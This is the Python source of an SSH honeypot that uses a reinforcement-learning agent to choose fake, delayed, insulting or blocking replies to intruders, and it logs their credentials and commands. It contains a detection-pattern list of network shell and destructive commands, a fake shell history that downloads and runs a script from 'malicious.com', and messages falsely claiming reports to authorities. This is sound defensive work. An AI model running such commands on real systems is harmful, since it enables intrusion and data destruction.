import asyncio
import asyncssh
import json
import logging
import random
import time
import uuid
import os
import subprocess
import re
import argparse
from datetime import datetime
from prometheus_client import Counter, Histogram, Gauge, start_http_server
from typing import Dict, Any, Tuple

SESSIONS_TOTAL = Counter('honeygotchi_sessions_total', 'Total SSH sessions', ['client_ip'])
COMMANDS_TOTAL = Counter('honeygotchi_commands_total', 'Total commands executed', ['action', 'is_malicious'])
SESSION_DURATION = Histogram('honeygotchi_session_duration_seconds', 'Session duration')
ACTIVE_SESSIONS = Gauge('honeygotchi_active_sessions', 'Currently active sessions')
RL_ACTIONS = Counter('honeygotchi_rl_actions_total', 'RL actions taken', ['action'])
MALICIOUS_COMMANDS = Counter('honeygotchi_malicious_commands_total', 'Malicious commands detected', ['pattern'])

def setup_logging(log_dir: str):
    os.makedirs(log_dir, exist_ok=True)
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s %(levelname)s %(message)s',
        handlers=[
            logging.FileHandler(os.path.join(log_dir, 'honeygotchi.log')),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

class EnhancedRLAgent:
    def __init__(self, epsilon: float = 0.3, learning_rate: float = 0.1):
        self.actions = ['ALLOW', 'DELAY', 'FAKE', 'INSULT', 'BLOCK']
        self.action_rewards = {action: 0.0 for action in self.actions}
        self.action_counts = {action: 0 for action in self.actions}
        self.epsilon = epsilon
        self.learning_rate = learning_rate
        self.malicious_patterns = {
            'download': re.compile(r'(wget|curl)\s+', re.IGNORECASE),
            'remote_shell': re.compile(r'(nc|netcat)\s+', re.IGNORECASE),
            'code_execution': re.compile(r'(python|perl|ruby|php)\s+-c', re.IGNORECASE),
            'shell_execution': re.compile(r'(bash|sh|zsh)\s+-c', re.IGNORECASE),
            'encoding': re.compile(r'base64\s+', re.IGNORECASE),
            'permissions': re.compile(r'chmod\s+(\+x|\d{3})', re.IGNORECASE),
            'tmp_operations': re.compile(r'/tmp/[a-zA-Z0-9_\-\.]+', re.IGNORECASE),
            'destructive': re.compile(r'rm\s+(-rf|--recursive)', re.IGNORECASE),
            'disk_operations': re.compile(r'dd\s+if=', re.IGNORECASE),
            'process_control': re.compile(r'(kill|killall|pkill)\s+', re.IGNORECASE),
            'background_execution': re.compile(r'nohup\s+', re.IGNORECASE),
            'pipe_operations': re.compile(r'[|;&]', re.IGNORECASE)
        }

    def select_action(self, command: str, session_info: Dict[str, Any]) -> str:
        is_malicious, pattern_type = self._analyze_command(command)
        if random.random() < self.epsilon:
            action = random.choice(self.actions)
        else:
            if sum(self.action_counts.values()) > 0:
                action = max(self.action_rewards, key=self.action_rewards.get)
            else:
                action = self._heuristic_action(is_malicious, pattern_type)
        RL_ACTIONS.labels(action=action).inc()
        self.action_counts[action] += 1
        if is_malicious and pattern_type:
            MALICIOUS_COMMANDS.labels(pattern=pattern_type).inc()
        return action

    def _analyze_command(self, command: str) -> Tuple[bool, str]:
        for pattern_name, pattern in self.malicious_patterns.items():
            if pattern.search(command):
                return True, pattern_name
        return False, ""

    def _heuristic_action(self, is_malicious: bool, pattern_type: str) -> str:
        if is_malicious:
            if pattern_type in ['download', 'code_execution']:
                return random.choice(['FAKE', 'DELAY'])
            elif pattern_type in ['destructive', 'remote_shell']:
                return random.choice(['INSULT', 'BLOCK'])
            else:
                return random.choice(['FAKE', 'INSULT', 'DELAY'])
        else:
            return 'ALLOW'

    def update_reward(self, action: str, reward: float):
        if action in self.action_rewards:
            count = self.action_counts[action]
            if count > 0:
                old_reward = self.action_rewards[action]
                self.action_rewards[action] = old_reward + self.learning_rate * (reward - old_reward)

    def get_stats(self) -> Dict[str, Any]:
        return {
            'action_rewards': self.action_rewards.copy(),
            'action_counts': self.action_counts.copy(),
            'epsilon': self.epsilon,
            'total_decisions': sum(self.action_counts.values())
        }

def generate_fake_files():
    """Generate a realistic fake file system as a nested dictionary."""
    return {
        "/": {
            "type": "dir",
            "children": {
                "bin": {"type": "dir", "children": {}},
                "boot": {"type": "dir", "children": {}},
                "dev": {"type": "dir", "children": {}},
                "etc": {
                    "type": "dir",
                    "children": {
                        "passwd": {"type": "file", "content":
                            "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n"},
                        "shadow": {"type": "file", "content":
                            "root:$6$salt$hash:18000:0:99999:7:::\nuser:$6$salt$hash:18000:0:99999:7:::\n"},
                        "hosts": {"type": "file", "content":
                            "127.0.0.1 localhost\n127.0.1.1 honeypot\n10.0.0.1 gateway\n"},
                        "ssh": {
                            "type": "dir",
                            "children": {
                                "sshd_config": {"type": "file", "content": "# SSH Daemon Configuration\n"}
                            }
                        }
                    }
                },
                "home": {
                    "type": "dir",
                    "children": {
                        "user": {
                            "type": "dir",
                            "children": {
                                "documents": {"type": "dir", "children": {}},
                                "downloads": {"type": "dir", "children": {}},
                                ".bash_history": {"type": "file", "content":
                                    "ls\ncd /tmp\nwget http://malicious.com/script.sh\nchmod +x script.sh\n./script.sh\nhistory -c\n"},
                                ".bashrc": {"type": "file", "content":
                                    "# .bashrc\nexport PS1='\\u@\\h:\\w\\$ '\nalias ll='ls -la'\n"},
                                "id_rsa": {"type": "file", "content":
                                    "-----BEGIN RSA PRIVATE KEY-----\nFAKEKEY\n-----END RSA PRIVATE KEY-----\n"},
                                "notes.txt": {"type": "file", "content":
                                    "Remember to update the server.\n"},
                                "config.json": {"type": "file", "content":
                                    '{"key": "value"}\n'},
                                ".ssh": {
                                    "type": "dir",
                                    "children": {
                                        "authorized_keys": {"type": "file", "content":
                                            "ssh-rsa AAAAB3Nza... user@host\n"}
                                    }
                                }
                            }
                        }
                    }
                },
                "tmp": {"type": "dir", "children": {
                    "malware.sh": {"type": "file", "content": "#!/bin/bash\necho 'pwnd'\n"}
                }},
                "var": {
                    "type": "dir",
                    "children": {
                        "log": {
                            "type": "dir",
                            "children": {
                                "auth.log": {"type": "file", "content":
                                    "Jan 15 10:30:22 honeypot sshd[1234]: Accepted password for user from 192.168.1.100\n"},
                                "syslog": {"type": "file", "content":
                                    "Jan 15 10:30:22 honeypot kernel: [0.000000] Linux version ...\n"}
                            }
                        }
                    }
                }
            }
        }
    }

class FakeFileSystem:
    def __init__(self):
        self.fs = generate_fake_files()
        self.current_path = ["/", "home", "user"]

    def _get_node(self, path_list):
        node = self.fs["/"]
        for part in path_list[1:]:
            node = node["children"].get(part)
            if not node:
                return None
        return node

    def list_dir(self, show_all=False):
        node = self._get_node(self.current_path)
        if node and node["type"] == "dir":
            files = list(node["children"].keys())
            if not show_all:
                files = [f for f in files if not f.startswith('.')]
            return files
        return []

    def read_file(self, filename):
        node = self._get_node(self.current_path)
        if node and node["type"] == "dir":
            file_node = node["children"].get(filename)
            if file_node and file_node["type"] == "file":
                return file_node["content"]
        return f"cat: {filename}: No such file or directory\n"

    def change_dir(self, dirname):
        if dirname == "..":
            if len(self.current_path) > 1:
                self.current_path.pop()
        elif dirname == ".":
            pass
        else:
            node = self._get_node(self.current_path)
            if node and dirname in node["children"] and node["children"][dirname]["type"] == "dir":
                self.current_path.append(dirname)
            else:
                return f"bash: cd: {dirname}: No such file or directory\n"
        return ""

    def get_pwd(self):
        return "/".join(self.current_path).replace("//", "/")

class AdvancedCommandProcessor:
    def __init__(self):
        self.fs = FakeFileSystem()
        self.hostname = f"srv-{random.randint(1000, 9999)}"
        self.fake_processes = [
            "1 root /sbin/init",
            "123 root [kthreadd]",
            "456 user /bin/bash",
            "789 nginx nginx: worker process",
            "1011 mysql /usr/sbin/mysqld",
            "1213 user python3 /opt/app/server.py"
        ]

    async def process_command(self, command: str, action: str, session_info: Dict[str, Any]) -> str:
        if action == 'ALLOW':
            return await self._execute_normal(command)
        elif action == 'DELAY':
            await asyncio.sleep(random.uniform(1.5, 3.0))
            return await self._execute_normal(command)
        elif action == 'FAKE':
            return self._generate_fake_response(command, session_info)
        elif action == 'INSULT':
            return self._generate_insult(session_info)
        elif action == 'BLOCK':
            # Dramatic disconnect message
            return (
                f"\n[SECURITY NOTICE] Your IP ({session_info.get('client_ip','unknown')}) has been reported and logged.\n"
                "Authorities and CDN security teams have been contacted.\n"
                "Session terminated. Bye.\n"
            )
        else:
            return await self._execute_normal(command)

    async def _execute_normal(self, command: str) -> str:
        parts = command.strip().split()
        if not parts:
            return ""
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        if cmd == 'ls':
            return self._cmd_ls(args)
        elif cmd == 'pwd':
            return self.fs.get_pwd() + "\n"
        elif cmd == 'whoami':
            return "user\n"
        elif cmd == 'cat':
            return self._cmd_cat(args)
        elif cmd == 'nano':
            return self._cmd_nano(args)
        elif cmd == 'cd':
            return self._cmd_cd(args)
        elif cmd == 'uname':
            return self._cmd_uname(args)
        elif cmd in ['wget', 'curl']:
            return self._cmd_download(cmd, args)
        elif cmd == 'ps':
            return self._cmd_ps(args)
        elif cmd == 'top':
            return self._cmd_top()
        elif cmd == 'netstat':
            return self._cmd_netstat()
        elif cmd == 'who':
            return self._cmd_who()
        elif cmd == 'history':
            return self._cmd_history()
        elif cmd == 'id':
            return "uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo)\n"
        elif cmd == 'uptime':
            return f" {datetime.now().strftime('%H:%M:%S')} up 5 days, 12:34, 2 users, load average: 0.15, 0.10, 0.05\n"
        elif cmd == 'df':
            return "Filesystem     1K-blocks    Used Available Use% Mounted on\n/dev/sda1       20971520 5242880  15728640  26% /\n"
        elif cmd == 'free':
            return "              total        used        free      shared  buff/cache   available\nMem:        2048000      512000     1024000       32000      512000     1536000\n"
        else:
            return f"{cmd}: command not found\n"

    def _cmd_ls(self, args: list) -> str:
        show_all = '-a' in args
        long_format = '-l' in args
        files = self.fs.list_dir(show_all=show_all)
        if long_format:
            result = []
            for f in files:
                if f.startswith('.'):
                    result.append(f"-rw------- 1 user user  1024 Jan 15 10:30 {f}")
                else:
                    result.append(f"drwxr-xr-x 2 user user  4096 Jan 15 10:30 {f}")
            return '\n'.join(result) + '\n'
        else:
            return '  '.join(files) + '\n'

    def _cmd_cat(self, args: list) -> str:
        if not args:
            return "cat: missing file operand\n"
        filename = args[0]
        return self.fs.read_file(filename)

    def _cmd_nano(self, args: list) -> str:
        if not args:
            return "What file do you want to edit?\n"
        filename = args[0]
        content = self.fs.read_file(filename)
        return (
            f"GNU nano 4.8              {filename}\n\n"
            f"{content}\n\n"
            f"[ Fake nano: Editing is not supported in this honeypot ]\n"
        )

    def _cmd_cd(self, args: list) -> str:
        if not args:
            self.fs.current_path = ["/", "home", "user"]
            return ""
        dirname = args[0]
        return self.fs.change_dir(dirname)

    def _cmd_uname(self, args: list) -> str:
        if '-a' in args:
            return f"Linux {self.hostname} 5.4.0-generic #1 SMP x86_64 GNU/Linux\n"
        elif '-r' in args:
            return "5.4.0-generic\n"
        else:
            return "Linux\n"

    def _cmd_ps(self, args: list) -> str:
        if 'aux' in ' '.join(args):
            header = "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            processes = []
            for proc in self.fake_processes:
                pid, user, cmd = proc.split(' ', 2)
                processes.append(f"{user:<8} {pid:>5}  0.1  0.5  12345  6789 ?        S    10:30   0:00 {cmd}")
            return header + '\n'.join(processes) + '\n'
        else:
            return '\n'.join([f"  {proc.split(' ', 2)[1]}  {proc.split(' ', 2)[2]}" for proc in self.fake_processes]) + '\n'

    def _cmd_top(self) -> str:
        return f"""top - {datetime.now().strftime('%H:%M:%S')} up 5 days, 12:34,  2 users,  load average: 0.15, 0.10, 0.05
Tasks: 156 total,   1 running, 155 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.3 us,  1.2 sy,  0.0 ni, 96.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   2000.0 total,   1000.0 free,    500.0 used,    500.0 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1500.0 avail Mem...
PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0  225484   9876   6543 S   0.0   0.5   0:01.23 systemd
  123 root      20   0       0      0      0 I   0.0   0.0   0:00.45 kthreadd
"""

    def _cmd_netstat(self) -> str:
        return """Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 192.168.1.100:22        192.168.1.1:54321       ESTABLISHED
tcp        0      0 192.168.1.100:80        192.168.1.50:45678      TIME_WAIT
"""

    def _cmd_who(self) -> str:
        return f"user     pts/0        {datetime.now().strftime('%Y-%m-%d %H:%M')} (192.168.1.100)\nroot     tty1         {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"

    def _cmd_history(self) -> str:
        return """  1  ls
  2  cd /tmp
  3  wget http://example.com/script.sh
  4  chmod +x script.sh
  5  ./script.sh
  6  history
"""

    def _cmd_download(self, cmd: str, args: list) -> str:
        if not args:
            return f"{cmd}: missing URL\n"
        url = args[-1]
        filename = url.split('/')[-1] or 'index.html'
        return f"""Resolving {url.split('/')[2]}... 93.184.216.34
Connecting to {url.split('/')[2]}|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2048 (2.0K) [application/octet-stream]
Saving to: '{filename}'

{filename}              100%[===================>]   2.00K  --.-KB/s    in 0s

{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} (5.00 MB/s) - '{filename}' saved [2048/2048]
"""

    def _generate_fake_response(self, command: str, session_info: Dict[str, Any]) -> str:
        if 'wget' in command or 'curl' in command:
            if 'malware' in command or 'exploit' in command:
                return "Download completed successfully.\nExecuting payload...\nBackdoor installed.\nConnection established to C&C server.\n"
            else:
                return self._cmd_download(command.split()[0], command.split()[1:])
        elif 'chmod +x' in command:
            return ""
        elif 'python -c' in command:
            return "Executing Python code...\nReverse shell established.\nAccess granted.\n"
        elif 'bash -c' in command or 'sh -c' in command:
            return "Shell command executed successfully.\nPrivileges escalated.\n"
        elif 'nc ' in command or 'netcat' in command:
            return "Listening on port 4444...\nConnection received from attacker.\n"
        else:
            return f"Command '{command}' executed successfully.\nOperation completed.\n"

    def _generate_insult(self, session_info: Dict[str, Any]) -> str:
        client_ip = session_info.get('client_ip', 'unknown')
        command_count = session_info.get('command_count', 0)
        insults = [
            f"Nice try, script kiddie from {client_ip}! Your attacks are pathetic.",
            f"Is that the best you can do, {client_ip}? My grandmother codes better exploits.",
            f"Access denied! Your IP {client_ip} has been reported to authorities.",
            f"Seriously? Go back to hacking school, {client_ip}.",
            f"Your weak attempts from {client_ip} are laughable. Try harder next time.",
            f"Still trying, {client_ip}? Your persistence is admirable but futile.",
            f"Command #{command_count} and still failing? Time to give up, {client_ip}.",
            f"Your attack patterns are so predictable, {client_ip}. Try something original."
        ]
        return random.choice(insults) + "\n" + (
            f"\n[SECURITY NOTICE] Your IP ({client_ip}) has been reported and logged.\n"
            "Authorities and CDN security teams have been contacted.\n"
            "Session terminated. Bye.\n"
        )

class HoneygotchiSSHSession(asyncssh.SSHServerSession):
    def __init__(self, rl_agent: EnhancedRLAgent, command_processor: AdvancedCommandProcessor, logger):
        self.rl_agent = rl_agent
        self.command_processor = command_processor
        self.logger = logger
        self.session_id = str(uuid.uuid4())
        self.client_ip = None
        self.start_time = time.time()
        self.command_count = 0
        self.username = "unknown"
        ACTIVE_SESSIONS.inc()

    def connection_made(self, chan):
        self.chan = chan
        self.client_ip = chan.get_extra_info('peername')[0]
        ip_suffix = self.client_ip.split('.')[-1]
        self.command_processor.hostname = f"srv-{ip_suffix}"
        self.logger.info(json.dumps({
            "event": "session_start",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "timestamp": datetime.now().isoformat()
        }))
        SESSIONS_TOTAL.labels(client_ip=self.client_ip).inc()

    def shell_requested(self):
        return True

    def session_started(self):
        banner = (
            "\n"
            "********************************************************************************\n"
            "*                           WARNING: AUTHORIZED ACCESS ONLY                    *\n"
            "* This system is for the use of authorized users only. Individuals using this   *\n"
            "* computer system without authority, or in excess of their authority, are       *\n"
            "* subject to having all their activities on this system monitored and recorded. *\n"
            "* If you are not an authorized user, disconnect now.                            *\n"
            "********************************************************************************\n"
            "All connections are monitored and recorded. Your IP, login time, and username\n"
            "have been noted and reported to security authorities.\n\n"
        )
        motd = (
            "Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-generic x86_64)\n"
            f"Last login: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')} from 192.168.1.1\n"
        )
        self.chan.write(banner)
        self.chan.write(motd)
        self._send_prompt()

    def data_received(self, data, datatype):
        try:
            command = data.strip()
            if command:
                asyncio.create_task(self._process_command(command))
        except Exception as e:
            self.logger.error(f"Error in data_received from {self.client_ip}: {e}")
            try:
                self.chan.write("Terminal error occurred. Please try again.\n")
                self._send_prompt()
            except:
                self.chan.close()

    async def _process_command(self, command: str):
        try:
            self.command_count += 1
            session_info = {
                'client_ip': self.client_ip,
                'session_id': self.session_id,
                'command_count': self.command_count,
                'username': self.username
            }
            action = self.rl_agent.select_action(command, session_info)
            is_malicious, pattern_type = self.rl_agent._analyze_command(command)
            self.logger.info(json.dumps({
                "event": "command_executed",
                "session_id": self.session_id,
                "client_ip": self.client_ip,
                "username": self.username,
                "command": command,
                "action": action,
                "is_malicious": is_malicious,
                "pattern_type": pattern_type,
                "command_count": self.command_count,
                "timestamp": datetime.now().isoformat()
            }))
            COMMANDS_TOTAL.labels(action=action, is_malicious=str(is_malicious)).inc()
            response = await self.command_processor.process_command(command, action, session_info)
            if response and action not in ('BLOCK', 'INSULT'):
                self.chan.write(response)
                self._send_prompt()
            elif action in ('BLOCK', 'INSULT'):
                self.chan.write(response)
                await asyncio.sleep(1)
                self.chan.close()
                return
            else:
                self._send_prompt()
            reward = self._calculate_reward(command, action, is_malicious, pattern_type)
            self.rl_agent.update_reward(action, reward)
        except Exception as e:
            self.logger.error(f"Error processing command '{command}' from {self.client_ip}: {e}")
            try:
                self.chan.write("Command processing error. Please try again.\n")
                self._send_prompt()
            except:
                self.chan.close()

    def _calculate_reward(self, command: str, action: str, is_malicious: bool, pattern_type: str) -> float:
        base_reward = 0.0
        if is_malicious:
            if action == 'FAKE':
                base_reward = 1.0
            elif action == 'INSULT':
                base_reward = 0.8
            elif action == 'DELAY':
                base_reward = 0.6
            elif action == 'BLOCK':
                base_reward = 0.4
            else:
                base_reward = -0.8
            if pattern_type in ['destructive', 'remote_shell', 'code_execution']:
                base_reward += 0.2
        else:
            if action == 'ALLOW':
                base_reward = 0.5
            elif action == 'DELAY':
                base_reward = 0.2
            else:
                base_reward = -0.3
        if self.command_count > 5:
            base_reward += 0.1
        return base_reward

    def _send_prompt(self):
        prompt = f"{self.username}@{self.command_processor.hostname}:{self.command_processor.fs.get_pwd()}$ "
        self.chan.write(prompt)

    def connection_lost(self, exc):
        duration = time.time() - self.start_time
        self.logger.info(json.dumps({
            "event": "session_end",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "username": self.username,
            "duration": duration,
            "commands_executed": self.command_count,
            "rl_stats": self.rl_agent.get_stats(),
            "timestamp": datetime.now().isoformat()
        }))
        SESSION_DURATION.observe(duration)
        ACTIVE_SESSIONS.dec()

# --- SSH Server ---
class HoneygotchiSSHServer(asyncssh.SSHServer):
    def __init__(self, logger):
        self.rl_agent = EnhancedRLAgent()
        self.command_processor = AdvancedCommandProcessor()
        self.logger = logger
        self.failed_attempts = {}
        self.current_username = "unknown"

    def connection_made(self, conn):
        client_ip = conn.get_extra_info('peername')[0]
        self.logger.info(f"New connection from {client_ip}")

    def begin_auth(self, username):
        self.current_username = username
        return True

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        client_ip = getattr(self, '_current_conn', {}).get('peername', ['unknown'])[0]
        if client_ip not in self.failed_attempts:
            self.failed_attempts[client_ip] = 0
        self.logger.info(json.dumps({
            "event": "login_attempt",
            "username": username,
            "password": password,
            "client_ip": client_ip,
            "attempt_count": self.failed_attempts[client_ip] + 1,
            "timestamp": datetime.now().isoformat()
        }))
        self.current_username = username
        return True

    def session_requested(self):
        session = HoneygotchiSSHSession(self.rl_agent, self.command_processor, self.logger)
        session.username = self.current_username
        return session

# --- SSH Host Key Handling ---
def ensure_ssh_host_key(key_path: str = 'ssh_host_key'):
    if not os.path.exists(key_path):
        print(f"Generating SSH host key: {key_path}")
        try:
            subprocess.run([
                'ssh-keygen', '-f', key_path, '-N', '', '-t', 'rsa', '-b', '2048'
            ], check=True, capture_output=True)
            print(f"SSH host key generated successfully: {key_path}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to generate SSH host key: {e}")
            raise
        except FileNotFoundError:
            print("ssh-keygen not found. Please install OpenSSH client.")
            raise

def parse_args():
    parser = argparse.ArgumentParser(description='Honeygotchi - Enhanced SSH Honeypot with RL')
    parser.add_argument('--port', type=int, default=2222, help='SSH port (default: 2222)')
    parser.add_argument('--metrics-port', type=int, default=9090, help='Prometheus metrics port (default: 9090)')
    parser.add_argument('--log-dir', default='/app/logs', help='Log directory (default: /app/logs)')
    parser.add_argument('--host-key', default='ssh_host_key', help='SSH host key file (default: ssh_host_key)')
    parser.add_argument('--generate-key', action='store_true', help='Force generate new SSH host key')
    parser.add_argument('--epsilon', type=float, default=0.3, help='RL exploration rate (default: 0.3)')
    parser.add_argument('--learning-rate', type=float, default=0.1, help='RL learning rate (default: 0.1)')
    return parser.parse_args()

async def main():
    args = parse_args()
    logger = setup_logging(args.log_dir)
    logger.info("Starting Honeygotchi Enhanced SSH Honeypot...")
    logger.info(f"Configuration: port={args.port}, metrics_port={args.metrics_port}, epsilon={args.epsilon}")
    if args.generate_key or not os.path.exists(args.host_key):
        ensure_ssh_host_key(args.host_key)
    try:
        start_http_server(args.metrics_port)
        logger.info(f"Prometheus metrics server started on port {args.metrics_port}")
    except Exception as e:
        logger.error(f"Failed to start metrics server: {e}")
        return
    try:
        server = await asyncssh.listen(
            host='0.0.0.0',
            port=args.port,
            server_factory=lambda: HoneygotchiSSHServer(logger),
            server_host_keys=[args.host_key]
        )
        logger.info(f"SSH honeypot started on port {args.port}")
        logger.info("Honeygotchi is ready! Waiting for connections...")
        await server.wait_closed()
    except Exception as e:
        logger.error(f"Failed to start SSH server: {e}")
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nHoneygotchi terminated by user.")
    except Exception as e:
        print(f"Fatal error: {e}")